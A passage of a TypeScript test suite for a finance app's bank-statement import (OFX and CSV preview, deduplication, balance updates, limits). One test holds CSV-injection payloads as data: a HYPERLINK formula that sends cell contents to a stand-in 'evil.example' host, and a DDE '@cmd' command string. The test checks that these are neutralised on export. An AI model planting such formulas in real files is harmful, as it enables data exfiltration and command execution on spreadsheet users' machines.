import { describe, expect, test, mock, beforeEach, afterEach } from 'bun:test';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { FakeRedis, storageMock, TEST_CTX, ctxKey, registerTestContainer, unscopedDataKeys } from './fake-redis';

// File import into a manual account, as the app calls it: app/api/import
// (preview, import, the list of imports, undo), the stores it keeps
// (lib/import/store.ts), the account's book it commits to
// (lib/manual-txns.ts), and the merge of the imported rows into the Activity
// tab (app/api/transactions) and the data download.

process.env.PLAID_ENCRYPTION_KEY = Buffer.alloc(32, 7).toString('base64');

// /api/transactions syncs Plaid; nothing is linked here, so it answers nothing.
mock.module('@/lib/plaid', () => ({
  plaidClient: {
    transactionsSync: async () => ({
      data: { added: [], modified: [], removed: [], accounts: [], next_cursor: 'c', has_more: false, transactions_update_status: 'HISTORICAL_UPDATE_COMPLETE' },
    }),
  },
}));

// Deserializing like Upstash: what production reads back.
const fake = new FakeRedis({ deserialize: true });
afterEach(() => expect(unscopedDataKeys(fake)).toEqual([]));
mock.module('@/lib/storage', () => storageMock(fake));

const { encrypt } = await import('@/lib/crypto');
const { forgetEpochs } = await import('@/lib/sessions');
const { saveManualAccount, getManualAccount } = await import('@/lib/manual');
const { manualTxnStore, addManualTxn, newManualTxn, editManualTxn } = await import('@/lib/manual-txns');
const { txnAnnotationStore, setExcluded } = await import('@/lib/txn-annotations');
const { importStore, importSettingsStore, takeImportRequest, IMPORT_REQUESTS_PER_HOUR } = await import('@/lib/import/store');
const { MAX_FILE_BYTES } = await import('@/lib/import/record');
const { collectUserData, buildUserExport, exportFile } = await import('@/lib/user-export');
const { csvCell } = await import('@/lib/csv');
const { countsInTotals, totalsCurrency } = await import('@/lib/spending');
const routes = await import('@/app/api/import/route');
const transactions = await import('@/app/api/transactions/route');
const annotations = await import('@/app/api/transaction-annotations/route');
const manualAccounts = await import('@/app/api/manual-accounts/route');
type ManualAccount = import('@/lib/manual').ManualAccount;

const ctx = TEST_CTX;
const FIXTURES = join(import.meta.dir, 'fixtures', 'import');
const fixture = (name: string) => new Uint8Array(readFileSync(join(FIXTURES, name)));

const CHECKING: ManualAccount = {
  account_id: 'manual_checking-1',
  name: 'Checking',
  institution_name: 'Cascade CU',
  type: 'depository',
  subtype: 'checking',
  balance: 1000,
  updated_at: '2026-10-01T12:00:00.000Z',
};
const VISA: ManualAccount = { ...CHECKING, account_id: 'manual_visa-1', name: 'Visa', type: 'credit', subtype: 'credit card', balance: 500 };
const SAVINGS: ManualAccount = { ...CHECKING, account_id: 'manual_savings-1', name: 'Savings', subtype: 'savings', balance: 5000 };

const day = (offset: number) => new Date(Date.now() + offset * 86_400_000).toISOString().slice(0, 10);
const compact = (d: string) => d.replace(/-/g, '');

/** An OFX 2.x bank statement with these transactions and ledger balance. */
function ofx(trns: { fitid: string; date: string; amount: number; name: string }[], opts: { acct?: string; ledger?: { amount: number; as_of: string }; card?: boolean } = {}) {
  const list = trns
    .map((t) => `<STMTTRN><TRNTYPE>${t.amount < 0 ? 'DEBIT' : 'CREDIT'}</TRNTYPE><DTPOSTED>${compact(t.date)}120000[-5:EST]</DTPOSTED><TRNAMT>${t.amount.toFixed(2)}</TRNAMT><FITID>${t.fitid}</FITID><NAME>${t.name}</NAME></STMTTRN>`)
    .join('\n');
  const ledger = opts.ledger ? `<LEDGERBAL><BALAMT>${opts.ledger.amount}</BALAMT><DTASOF>${compact(opts.ledger.as_of)}</DTASOF></LEDGERBAL>` : '';
  const from = opts.card ? `<CCACCTFROM><ACCTID>${opts.acct ?? '4111000011112222'}</ACCTID></CCACCTFROM>` : `<BANKACCTFROM><BANKID>325081403</BANKID><ACCTID>${opts.acct ?? '0001234567'}</ACCTID><ACCTTYPE>CHECKING</ACCTTYPE></BANKACCTFROM>`;
  const [rs, trnrs, msgs] = opts.card ? ['CCSTMTRS', 'CCSTMTTRNRS', 'CREDITCARDMSGSRSV1'] : ['STMTRS', 'STMTTRNRS', 'BANKMSGSRSV1'];
  return `<?xml version="1.0"?><?OFX OFXHEADER="200" VERSION="220"?><OFX><${msgs}><${trnrs}><STATUS><CODE>0</CODE></STATUS><${rs}><CURDEF>USD</CURDEF>${from}<BANKTRANLIST>\n${list}\n</BANKTRANLIST>${ledger}</${rs}></${trnrs}></${msgs}></OFX>`;
}

type Res = { status: number; body: any; headers: Headers };
const asRes = async (res: Response): Promise<Res> => ({ status: res.status, body: await res.json(), headers: res.headers });

/** A form upload as the import sheet sends one. */
function upload(meta: Record<string, unknown>, file: Uint8Array | string, name = 'statement.ofx'): Request {
  const form = new FormData();
  const bytes = typeof file === 'string' ? new TextEncoder().encode(file) : file;
  form.set('file', new Blob([bytes as Uint8Array<ArrayBuffer>]), name);
  form.set('meta', JSON.stringify({ file_name: name, ...meta }));
  return new Request('http://localhost/api/import', { method: 'POST', body: form });
}
const post = async (meta: Record<string, unknown>, file: Uint8Array | string, name?: string) => asRes(await routes.POST(upload(meta, file, name)));
const preview = (account_id: string, file: Uint8Array | string, options: object = {}, name?: string) => post({ action: 'preview', account_id, options }, file, name);
const importFile = (account_id: string, file: Uint8Array | string, options: object = {}, extra: object = {}, name?: string) =>
  post({ action: 'import', account_id, options, ...extra }, file, name);
const list = async (account_id: string) => asRes(await routes.GET(new Request(`http://localhost/api/import?account_id=${account_id}`)));
const undo = async (body: object) =>
  asRes(await routes.DELETE(new Request('http://localhost/api/import', { method: 'DELETE', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) })));
const book = async (account_id = CHECKING.account_id) => (await manualTxnStore.get(ctx, account_id))?.rows ?? [];

const CARD_MAPPING = { csv: { columns: { date: 0, description: 3, category: 4, debit: 5, credit: 6 }, sign: 'negative-out' } };

/** Every key the fake holds, with its value(s) as stored. */
function snapshot(): Record<string, unknown> {
  const out: Record<string, unknown> = {};
  for (const [k, v] of (fake as any).strings as Map<string, string>) out[k] = v;
  for (const [k, h] of (fake as any).hashes as Map<string, Map<string, string>>) out[k] = Object.fromEntries(h);
  return out;
}
const changedKeys = (before: Record<string, unknown>, after: Record<string, unknown>) =>
  [...new Set([...Object.keys(before), ...Object.keys(after)])].filter((k) => JSON.stringify(before[k]) !== JSON.stringify(after[k])).sort();
/** The keys a test may see change for the request limit alone. */
const COUNTER = ctxKey('import-requests');

/** Runs `fn` with console output collected instead of printed. */
async function quietly<T>(fn: () => Promise<T>): Promise<{ result: T; logged: string }> {
  const saved = [console.error, console.warn, console.log, console.info];
  const lines: string[] = [];
  const keep = (...args: unknown[]) => lines.push(args.map((a) => (a instanceof Error ? `${a.name}: ${a.message} ${a.stack}` : typeof a === 'string' ? a : JSON.stringify(a))).join(' '));
  console.error = console.warn = console.log = console.info = keep;
  try {
    return { result: await fn(), logged: lines.join('\n') };
  } finally {
    [console.error, console.warn, console.log, console.info] = saved;
  }
}

/** Runs `meanwhile` once, just before the next run of the seam's script
 *  `name` reaches storage, as another device would. */
function atNextScript(name: string, meanwhile: () => Promise<unknown>) {
  const original = fake.eval.bind(fake);
  (fake as any).eval = async (script: string, keys: string[], args: string[]) => {
    if (script.split('\n', 1)[0] !== `-- nya:${name}`) return original(script, keys, args);
    delete (fake as any).eval;
    await meanwhile();
    return original(script, keys, args);
  };
}

beforeEach(async () => {
  fake.reset();
  forgetEpochs();
  await registerTestContainer(fake);
  delete (fake as any).eval;
  delete process.env.MAX_TXN_BLOB_CHARS;
  for (const a of [CHECKING, VISA, SAVINGS]) await saveManualAccount(ctx, a);
});

describe('an OFX statement into a manual account', () => {
  test('the preview counts what is new, repeated and unreadable, shows the first rows as they will read, and writes nothing', async () => {
    const before = snapshot();
    const { status, body } = await preview(CHECKING.account_id, fixture('checking-ofx102.ofx'), {}, 'checking-ofx102.ofx');
    expect(status).toBe(200);
    const p = body.preview;
    expect(p).toMatchObject({
      format: 'ofx',
      encoding: 'windows-1252',
      counts: { new: 8, present: 0, repeated: 1, unreadable: 0 },
      first_date: '2026-09-01',
      last_date: '2026-09-30',
      currency: 'USD',
      other_currencies: [],
      totals: { out: 2043.47, in: 2450.42 },
      warnings: [],
      account_mismatch: null,
      statement: { label: 'Checking ending 4567', kind: 'bank', account: { mask: '4567' } },
    });
    expect(p.rows).toHaveLength(8);
    expect(p.rows[0]).toEqual({ line: 43, date: '2026-09-01', name: 'ACME CORP PAYROLL', amount: -2450, currency: 'USD', category: null, note: 'DIRECT DEP PPD ID 9876543210', outcome: 'new' });
    expect(p.rows[6]).toMatchObject({ name: 'AT&T *WIRELESS', outcome: 'repeated' });
    // A statement as of September 30 is shown, never set: it is not today's.
    expect(p.balance).toEqual({ amount: 1946.05, as_of: '2026-09-30', from: 1000, refusal: 'past' });
    expect(changedKeys(before, snapshot())).toEqual([COUNTER]);
  });

  test('importing adds the rows in one write, each with its source, FITID and import, and keeps the raw records', async () => {
    const before = snapshot();
    const { status, body } = await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'), {}, {}, 'checking-ofx102.ofx');
    expect(status).toBe(200);
    expect(body).toMatchObject({ imported: 8, present: 0, repeated: 1, unreadable: 0, balance_updated: false });
    const id = body.import_id as string;
    expect(id).toMatch(/^import:[0-9a-f-]{36}$/);
    const rows = await book();
    expect(rows).toHaveLength(8);
    expect(rows.map((r) => r.source_id)).toEqual(['202609010001', '202609030001', '202609030002', '202609050001', '202609100001', '202609120001', '202609150001', '202609300001']);
    expect(rows[1]).toMatchObject({ account_id: CHECKING.account_id, date: '2026-09-03', amount: 4.5, currency: 'USD', name: 'SQ *BLUE BOTTLE COFFEE', note: 'POS PURCHASE 0902 SEATTLE WA', source: 'import:ofx', import_id: id, category: null });
    expect(rows.every((r) => r.created_at === r.updated_at && r.import_id === id)).toBe(true);
    // The raw records: every one read, in file order, with what became of it.
    const entry = (await importStore.get(ctx, id))!;
    expect(entry).toMatchObject({
      version: 1,
      account_id: CHECKING.account_id,
      format: 'ofx',
      source: 'import:ofx',
      file_name: 'checking-ofx102.ofx',
      encoding: 'windows-1252',
      counts: { imported: 8, present: 0, repeated: 1, unreadable: 0 },
      currency: 'USD',
      first_date: '2026-09-01',
      last_date: '2026-09-30',
      statement: { label: 'Checking ending 4567', mask: '4567', bank_id: '325081403', ledger: { amount: 1946.05, as_of: '2026-09-30' } },
      columns: null,
    });
    expect(entry.records).toHaveLength(9);
    expect(entry.records[1]).toEqual({
      line: 51,
      outcome: 'imported',
      row_id: rows[1].id,
      raw: { TRNTYPE: 'DEBIT', DTPOSTED: '20260903', TRNAMT: '-4.50', FITID: '202609030001', NAME: 'SQ *BLUE BOTTLE COFFEE', MEMO: 'POS PURCHASE 0902 SEATTLE WA' },
    });
    expect(entry.records[6]).toMatchObject({ outcome: 'repeated', line: 90 });
    // Never the account's whole number.
    expect(JSON.stringify(entry)).not.toContain('0001234567');
    // The statement's account is remembered, masked, for the next file.
    expect((await importSettingsStore.get(ctx, CHECKING.account_id))?.ofx).toEqual({ statement: { kind: 'bank', bank_id: '325081403', mask: '4567', type: 'CHECKING' }, flip: false });
    // The balance stays what was typed.
    expect(await getManualAccount(ctx, CHECKING.account_id)).toEqual(CHECKING);
    expect(changedKeys(before, snapshot())).toEqual([COUNTER, ctxKey('import-settings'), ctxKey('imports'), ctxKey('manual-transactions')].sort());
  });

  test('the same statement again adds nothing, and makes no import of it', async () => {
    await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    const before = snapshot();
    const again = await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    expect(again.body).toMatchObject({ imported: 0, present: 8, repeated: 1, import_id: null });
    expect(await book()).toHaveLength(8);
    expect(await importStore.count(ctx)).toBe(1);
    // Only the counter, and the settings' moment.
    expect(changedKeys(before, snapshot())).toEqual([COUNTER, ctxKey('import-settings')].sort());
  });

  test('an overlapping statement adds only what is new, found by FITID even where the row was edited since', async () => {
    const first = ofx([
      { fitid: 'A1', date: '2026-09-01', amount: -10, name: 'One' },
      { fitid: 'A2', date: '2026-09-02', amount: -20, name: 'Two' },
    ]);
    await importFile(CHECKING.account_id, first);
    const [one] = await book();
    await editManualTxn(ctx, one.id, { name: 'Renamed', category: 'shopping' });
    const second = ofx([
      { fitid: 'A2', date: '2026-09-02', amount: -20, name: 'Two' },
      { fitid: 'A1', date: '2026-09-01', amount: -10, name: 'One' },
      { fitid: 'A3', date: '2026-09-03', amount: -30, name: 'Three' },
    ]);
    const p = await preview(CHECKING.account_id, second);
    expect(p.body.preview.counts).toEqual({ new: 1, present: 2, repeated: 0, unreadable: 0 });
    expect((await importFile(CHECKING.account_id, second)).body).toMatchObject({ imported: 1, present: 2 });
    expect((await book()).map((r) => r.name)).toEqual(['Renamed', 'Two', 'Three']);
  });

  test('a row typed by hand is matched by its content: one of two identical coffees is found, the other added', async () => {
    const typed = newManualTxn(CHECKING.account_id, { date: '2026-09-03', amount: 4.5, currency: 'USD', name: 'SQ *Blue Bottle Coffee', category: null, note: null });
    await addManualTxn(ctx, typed);
    const { body } = await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    expect(body).toMatchObject({ imported: 7, present: 1, repeated: 1 });
    const entry = (await importStore.get(ctx, body.import_id))!;
    expect(entry.records[1]).toMatchObject({ outcome: 'present', row_id: typed.id });
    expect(entry.records[2]).toMatchObject({ outcome: 'imported' });
  });

  test('a file holding several statements asks which; the one chosen is imported', async () => {
    const asked = await preview(SAVINGS.account_id, fixture('two-accounts.qfx'), {}, 'two-accounts.qfx');
    expect(asked.status).toBe(200);
    expect(asked.body.needs).toBe('statement');
    expect(asked.body.statements.map((s: any) => s.label)).toEqual(['Checking ending 3333', 'Savings ending 6666']);
    const done = await importFile(SAVINGS.account_id, fixture('two-accounts.qfx'), { statement: 1 }, {}, 'two-accounts.qfx');
    expect(done.body).toMatchObject({ imported: 1 });
    expect((await book(SAVINGS.account_id)).map((r) => [r.name, r.amount, r.source_id])).toEqual([['INTEREST EARNED', -3.21, 'QFX-SAV-1']]);
  });

  test('a file for another account than last time is caught: said in the preview, refused until the person says go ahead', async () => {
    await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    const other = ofx([{ fitid: 'Z1', date: '2026-09-04', amount: -5, name: 'Other bank' }], { acct: '9999888877' });
    const p = await preview(CHECKING.account_id, other);
    expect(p.body.preview.account_mismatch).toEqual({ expected: 'an account ending 4567 at bank 325081403', found: 'an account ending 8877 at bank 325081403' });
    const refused = await importFile(CHECKING.account_id, other);
    expect(refused.status).toBe(409);
    expect(refused.body.error).toBe('This file is for an account ending 8877 at bank 325081403, but Checking’s last OFX file was for an account ending 4567 at bank 325081403. Check it is the right file, then import it anyway.');
    expect(await book()).toHaveLength(8);
    expect((await importFile(CHECKING.account_id, other, {}, { acknowledge_account: true })).body).toMatchObject({ imported: 1 });
  });

  test('a credit card statement: purchases out, the payment in, and its balance owed offered only when it is today’s', async () => {
    const today = day(0);
    const card = ofx(
      [
        { fitid: 'C1', date: day(-3), amount: -87.2, name: 'GROCER' },
        { fitid: 'C2', date: day(-2), amount: 500, name: 'PAYMENT - THANK YOU' },
      ],
      { card: true, ledger: { amount: -1234.56, as_of: today } }
    );
    const p = (await preview(VISA.account_id, card)).body.preview;
    expect(p.rows.map((r: any) => r.amount)).toEqual([87.2, -500]);
    expect(p.balance).toEqual({ amount: 1234.56, as_of: today, from: 500, refusal: null });
    // A card statement onto a checking account: its sign would mean the
    // opposite, so it is only shown.
    expect((await preview(CHECKING.account_id, card)).body.preview.balance.refusal).toBe('kind');
  });
});

describe('the statement’s balance', () => {
  const today = day(0);
  const statement = (as_of: string, amount = 2345.67) => ofx([{ fitid: 'B1', date: day(-1), amount: -12, name: 'Shop' }], { ledger: { amount, as_of } });

  test('set only when asked, as a normal balance update from the figure the preview showed: rows, balance, estimate rebuilt, cache dropped', async () => {
    await fake.set(ctxKey('history:backfill-done'), 'v3');
    const done = await importFile(CHECKING.account_id, statement(today), {}, { balance: { from: 1000, to: 2345.67 } });
    expect(done.status).toBe(200);
    expect(done.body).toMatchObject({ imported: 1, balance_updated: true, balance: 2345.67 });
    expect((await getManualAccount(ctx, CHECKING.account_id))!.balance).toBe(2345.67);
    expect(fake.strings.has(ctxKey('history:backfill-done'))).toBe(false);
    expect((await importStore.get(ctx, done.body.import_id))!.balance_update).toEqual({ from: 1000, to: 2345.67, as_of: today });
    // Sent again: nothing new, and the balance is already the statement's.
    const again = await importFile(CHECKING.account_id, statement(today), {}, { balance: { from: 1000, to: 2345.67 } });
    expect(again.body).toMatchObject({ imported: 0, balance_updated: true });
    // Without the tick, an import never moves it.
    await importFile(SAVINGS.account_id, statement(today));
    expect((await getManualAccount(ctx, SAVINGS.account_id))!.balance).toBe(5000);
  });

  test('yesterday’s is offered too; an older one is shown and refused if asked, so no past figure is set as today’s', async () => {
    expect((await preview(CHECKING.account_id, statement(day(-1)))).body.preview.balance.refusal).toBeNull();
    const old = day(-2);
    expect((await preview(CHECKING.account_id, statement(old))).body.preview.balance).toEqual({ amount: 2345.67, as_of: old, from: 1000, refusal: 'past' });
    const refused = await importFile(CHECKING.account_id, statement(old), {}, { balance: { from: 1000, to: 2345.67 } });
    expect(refused.status).toBe(400);
    expect(await book()).toEqual([]);
    expect((await getManualAccount(ctx, CHECKING.account_id))!.balance).toBe(1000);
  });

  test('a balance changed since the preview refuses the whole import, as the quick-add form refuses its add', async () => {
    await saveManualAccount(ctx, { ...CHECKING, balance: 1111 });
    const refused = await importFile(CHECKING.account_id, statement(today), {}, { balance: { from: 1000, to: 2345.67 } });
    expect(refused.status).toBe(409);
    expect(refused.body).toMatchObject({ balance: 1111 });
    expect(refused.body.error).toContain('since the preview, so nothing was imported');
    expect(await book()).toEqual([]);
    // Nor a figure other than the statement's.
    expect((await importFile(CHECKING.account_id, statement(today), {}, { balance: { from: 1111, to: 9 } })).status).toBe(400);
  });

  test('nothing the import does writes the history layer, recorded or estimated, balance or not', async () => {
    const layers = ['history:net-worth', 'history:net-worth:est', 'history:accounts', 'history:accounts:partial', 'history:accounts:est', 'history:accounts:est:ext'];
    for (const k of layers) await fake.set(ctxKey(k), `stored-${k}`);
    const history = () => Object.fromEntries(Object.entries(snapshot()).filter(([k]) => layers.some((l) => k === ctxKey(l))));
    const before = history();
    await preview(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    const { body } = await importFile(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    await importFile(SAVINGS.account_id, statement(today), {}, { balance: { from: 5000, to: 2345.67 } });
    await importFile(VISA.account_id, fixture('card-debit-credit.csv'), CARD_MAPPING, {}, 'card.csv');
    await undo({ account_id: CHECKING.account_id, import_id: body.import_id, confirm: true });
    expect(history()).toEqual(before);
    expect(Object.keys(snapshot()).filter((k) => k.startsWith(ctxKey('history:')) && !layers.some((l) => k === ctxKey(l)))).toEqual([]);
  });
});

describe('a CSV file', () => {
  test('without a mapping, the route says what the sheet must ask, with the columns, the first rows and a guess', async () => {
    const { status, body } = await preview(VISA.account_id, fixture('card-debit-credit.csv'), {}, 'card.csv');
    expect(status).toBe(200);
    expect(body).toMatchObject({ needs: 'mapping', format: 'csv', guess: { date: 0, description: 3, category: 4, debit: 5, credit: 6 } });
    expect(body.table.header).toHaveLength(7);
    expect(body.table.sample[0].cells[3]).toBe('AMAZON MKTPL*2X3Y4, AMZN.COM/BILL WA');
  });

  test('imports with the mapping, remembers it by column name, and a second import reports what it skipped', async () => {
    const first = await importFile(VISA.account_id, fixture('card-debit-credit.csv'), CARD_MAPPING, {}, 'card.csv');
    expect(first.body).toMatchObject({ imported: 11, present: 0 });
    const rows = await book(VISA.account_id);
    expect(rows.filter((r) => r.name === 'BLUE BOTTLE COFFEE SEATTLE WA')).toHaveLength(2); // two coffees, both real
    expect(rows[0]).toMatchObject({ source: 'import:csv', source_id: '2026-09-28|USD|2399|amazon mktpl 2x3y4 amzn com bill wa', category: 'merchandise' });
    const settings = (await list(VISA.account_id)).body.settings;
    expect(settings.csv).toEqual({
      columns: { date: 'Transaction Date', description: 'Description', debit: 'Debit', credit: 'Credit', category: 'Category' },
      sign: 'negative-out',
      decimal: '.',
      date_order: null,
      delimiter: ',',
      currency: 'USD',
    });
    const again = await importFile(VISA.account_id, fixture('card-debit-credit.csv'), CARD_MAPPING, {}, 'card.csv');
    expect(again.body).toMatchObject({ imported: 0, present: 11 });
    // One coffee deleted since: that one comes back, the rest are skipped.
    const coffee = (await book(VISA.account_id)).find((r) => r.name.startsWith('BLUE BOTTLE'))!;
    await manualTxnStore.update(ctx, VISA.account_id, (b) => ({ ...b!, rows: b!.rows.filter((r) => r.id !== coffee.id) }));
    expect((await importFile(VISA.account_id, fixture('card-debit-credit.csv'), CARD_MAPPING)).body).toMatchObject({ imported: 1, present: 10 });
  });

  test('a European file: decimal commas, day first, euros, its summary lines counted', async () => {
    const options = { csv: { columns: { date: 0, description: 2, amount: 7, note: 4, currency: 8 }, sign: 'negative-out' } };
    const p = (await preview(CHECKING.account_id, fixture('giro-semicolon.csv'), options, 'giro.csv')).body.preview;
    expect(p).toMatchObject({ currency: 'EUR', counts: { new: 6 }, read: { date_order: 'dmy', date_style: 'dmy', decimal: ',', delimiter: ';', header_line: 13, skipped: 9 }, encoding: 'windows-1252' });
    expect(p.rows[1]).toMatchObject({ name: 'Stadtwerke München', amount: 89, currency: 'EUR', date: '2026-09-29' });
  });

  test('ambiguous dates are asked about, never guessed', async () => {
    const text = 'Date,Description,Amount\n09/01/2026,A,-1\n09/02/2026,B,-2\n';
    const r = await preview(CHECKING.account_id, text, { csv: { columns: { date: 0, description: 1, amount: 2 }, sign: 'negative-out' } }, 'a.csv');
    expect(r.body).toMatchObject({ needs: 'date_order', detection: { ambiguous: true } });
    const done = await importFile(CHECKING.account_id, text, { date_order: 'dmy', csv: { columns: { date: 0, description: 1, amount: 2 }, sign: 'negative-out' } }, {}, 'a.csv');
    expect((await book()).map((x) => x.date)).toEqual(['2026-01-09', '2026-02-09']);
    expect(done.body.imported).toBe(2);
  });

  test('a formula in a description is stored as text, kept as text in the download, and guarded in any CSV', async () => {
    const { body } = await importFile(VISA.account_id, fixture('card-debit-credit.csv'), CARD_MAPPING, {}, 'card.csv');
    const stored = (await book(VISA.account_id)).map((r) => r.name);
    const formula = '=HYPERLINK("http://evil.example/?x="&A1,"Refund")';
    expect(stored).toContain(formula);
    expect(stored).toContain('+SUM(1+2)');
    expect(stored).toContain("@cmd|' /C calc'!A0");
    const doc = buildUserExport(await collectUserData({ ctx, userId: null }), new Date());
    const rows = (doc as any)['manual-transactions'][0].value.rows as { name: string }[];
    expect(rows.map((r) => r.name)).toContain(formula);
    const records = (doc as any).imports[0].value.records as { raw: string[] }[];
    expect(records.some((r) => r.raw[3] === formula)).toBe(true);
    // In the written file, a JSON string: nothing a spreadsheet would run.
    expect([...exportFile(doc, 'json').pieces()].join('')).toContain(JSON.stringify(formula));
    for (const name of stored.filter((n) => /^[=+@-]/.test(n))) expect(csvCell(name).replace(/^"/, '')[0]).toBe("'");
    expect(body.import_id).toBeTruthy();
  });
});

describe('limits and refusals', () => {
  test('a request that claims more than the limit is refused before its body is read', async () => {
    let read = false;
    const req = {
      headers: new Headers({ 'content-length': '1000000000', 'content-type': 'multipart/form-data; boundary=x' }),
      arrayBuffer: async () => {
        read = true;
        return new ArrayBuffer(0);
      },
    } as unknown as Request;
    const res = await asRes(await routes.POST(req));
    expect(res.status).toBe(413);
    expect(read).toBe(false);
  });

  test('a file over 3 MB is refused, and so is a body over the limit whatever it claims', async () => {
    const big = new Uint8Array(MAX_FILE_BYTES + 1).fill(0x41);
    expect((await preview(CHECKING.account_id, big)).status).toBe(413);
    const req = new Request('http://localhost/api/import', { method: 'POST', headers: { 'content-type': 'multipart/form-data; boundary=x' }, body: new Uint8Array(MAX_FILE_BYTES + 70 * 1024) });
    expect((await routes.POST(req)).status).toBe(413);
  });

  test('more than 10,000 transactions is refused whole, with nothing written', async () => {
    const many = 'Date,Description,Amount\n' + Array.from({ length: 10_001 }, (_, i) => `2026-09-01,Row ${i},-1`).join('\n');
    const r = await importFile(CHECKING.account_id, many, { csv: { columns: { date: 0, description: 1, amount: 2 }, sign: 'negative-out' } }, {}, 'many.csv');
    expect(r.status).toBe(422);
    expect(r.body.error).toContain('more than 10,000 transactions');
    expect(await manualTxnStore.count(ctx)).toBe(0);
  });

  test('requests are limited per person an hour, and a limit that can’t be read refuses rather than opens', async () => {
    for (let i = 0; i < IMPORT_REQUESTS_PER_HOUR - 1; i++) await takeImportRequest(ctx);
    expect((await preview(CHECKING.account_id, fixture('checking-ofx102.ofx'))).status).toBe(200);
    const over = await preview(CHECKING.account_id, fixture('checking-ofx102.ofx'));
    expect(over.status).toBe(429);
    expect(Number(over.headers.get('Retry-After'))).toBeGreaterThan(0);
    expect((await undo({ account_id: CHECKING.account_id, import_id: 'import:0b6f5a52-3c1d-4e2f-8a9b-1c2d3e4f5a6b', confirm: true })).status).toBe(429);
    fake.reset();
    await registerTestContainer(fake);
    forgetEpochs();
    await saveManualAccount(ctx, CHECKING);
    fake.failNext('eval');
    const { result } = await quietly(() => preview(CHECKING.account_id, fixture('checking-ofx102.ofx')));
    expect(result.status).toBe(503);
  });

  test('every field of the request is checked', async () => {
    const file = fixture('checking-ofx102.ofx');
    expect((await post({ action: 'peek', account_id: CHECKING.account_id }, file)).status).toBe(400);
    expect((await post({ action: 'preview', account_id: 'acct_plaid' }, file)).status).toBe(400);
    expect((await post({ action: 'preview', account_id: 'manual_gone' }, file)).status).toBe(404);
    for (const options of [{ statement: -1 }, { flip: 'yes' }, { currency: 'USX' }, { date_order: 'ymd' }, { decimal: ';' }, { extra: 1 }, { csv: { columns: { date: 0 }, sign: 'negative-out' } }, { csv: { columns: { date: 0, description: 1, nope: 2 }, sign: 'negative-out' } }, { csv: { columns: { date: 0, description: 1 }, sign: 'sideways' } }]) {
      expect((await preview(CHECKING.account_id, file, options)).status, JSON.stringify(options)).toBe(400);
    }
    expect((await post({ action: 'import', account_id: CHECKING.account_id, balance: { from: 'x', to: 1 } }, file)).status).toBe(400);
    expect((await preview(CHECKING.account_id, new Uint8Array(0))).status).toBe(400);
    const notForm = new Request('http://localhost/api/import', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}' });
    expect((await routes.POST(notForm)).status).toBe(400);
    const noMeta = new FormData();
    noMeta.set('file', new Blob([file]), 'a.ofx');
    expect((await routes.POST(new Request('http://localhost/api/import', { method: 'POST', body: noMeta }))).status).toBe(400);
    // A file that isn't a statement says why.
    const r = await preview(CHECKING.account_id, 'OFXHEADER:100\n\n<OFX></OFX>');
    expect(r.status).toBe(422);
    expect(r.body).toEqual({ error: 'This OFX file holds no bank or credit card statement.', format: 'ofx' });
  });

  test('an account whose transactions can’t be read is refused (409), never matched as empty', async () => {
    await fake.hset(ctxKey('manual-transactions'), { [CHECKING.account_id]: 'not-ciphertext-but-long-enough-to-be-tried' });
    const { result } = await quietly(() => preview(CHECKING.account_id, fixture('checking-ofx102.ofx')));
    expect(result.status).toBe(409);
    expect(result.body).toMatchObject({ unreadable: true, unreadable_ids: [CHECKING.account_id] });
    const { result: imported } = await quietly(() => importFile(CHECKING.account_id, fixture('checking-ofx102.ofx')));
    expect(imported.status).toBe(409);
    expect(await importStore.count(ctx)).toBe(0);
  });

  test('an import the account’s book can’t hold is refused whole with a clear message: nothing written, nothing trimmed', async () => {
    // A book of a hundred rows that don't compress, near a lowered ceiling.
    const filler = Array.from({ length: 100 }, () =>
      newManualTxn(CHECKING.account_id, { date: '2026-08-01', amount: 1, currency: 'USD', name: crypto.randomUUID(), category: null, note: crypto.randomUUID() })
    );
    await manualTxnStore.set(ctx, CHECKING.account_id, { version: 1, rows: filler });
    const stored = fake.hashes.get(ctxKey('manual-transactions'))!.get(CHECKING.account_id)!;
    process.env.MAX_TXN_BLOB_CHARS = String(stored.length + 60);
    const before = snapshot();
    const file = ofx([1, 2, 3].map((i) => ({ fitid: `S${i}`, date: '2026-09-0' + i, amount: -i, name: crypto.randomUUID() })));
    const { result, logged } = await quietly(() => importFile(CHECKING.account_id, file));
    expect(result.status).toBe(413);
    expect(result.body.error).toBe('Checking can’t take this import: with it, its transactions would be too large to store, so nothing was imported. Import a shorter period.');
    expect(logged).toContain('refusing to save manual-transactions');
    expect(changedKeys(before, snapshot())).toEqual([COUNTER]);
    expect(await book()).toEqual(filler);
    expect(await importStore.count(ctx)).toBe(0);
  });

  test('records too large to keep are refused before the book is touched', async () => {
    process.env.MAX_TXN_BLOB_CHARS = '400';
    const before = snapshot();
    const { result } = await quietly(() => importFile(CHECKING.account_id, fixture('checking-ofx102.ofx')));
    expect(result.status).toBe(413);
    expect(result.body.error).toBe('This file’s records are too large to keep with the import, so nothing was imported. Import a shorter period.');
    expect(changedKeys(before, snapshot())).toEqual([COUNTER]);
  });

  test('a write of the rows that fails leaves no record behind; one that may have landed keeps it, listed', async () => {
    // The book's compare-and-set fails as a storage blip would.
    const original = fake.eval.bind(fake);
    (fake as any).eval = async (script: string, keys: string[], args: string[]) => {
      if (script.startsWith('-- nya:repo-update-entries')) {
        delete (fake as any).eval;
        throw new Error('storage blip');
      }
      return original(script, keys, args);
    };
    const { result } = await quietly(() => importFile(CHECKING.account_id, fixture('checking-ofx102.ofx')));
    expect(result.status).toBe(500);
    expect(await importStore.count(ctx)).toBe(0);
    expect(await book()).toEqual([]);
  });

  test('a file is never logged: not its rows, not its name, on any path', async () => {
    const marker = 'MARKER-7f3c9e1d';
    const file = ofx([{ fitid: 'L1', date: '2026-09-01', amount: -1, name: `${marker} shop` }]);
    const { logged } = await quietly(async () => {
      await preview(CHECKING.account_id, file, {}, `${marker}.ofx`);
      await importFile(CHECKING.account_id, file, {}, {}, `${marker}.ofx`);
      process.env.MAX_TXN_BLOB_CHARS = '300';
